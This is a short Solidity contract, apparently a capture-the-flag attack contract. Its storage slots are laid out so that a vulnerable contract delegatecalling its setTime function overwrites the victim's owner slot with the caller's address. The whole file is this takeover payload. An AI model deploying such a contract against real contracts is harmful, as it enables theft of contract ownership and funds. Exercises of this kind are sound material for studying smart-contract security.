pragma solidity ^0.8;

contract TimeFucker {
    address dummy1;
    address dummy2;
    address owner;

    function setTime(uint256) public {
        owner = tx.origin;
    }
}
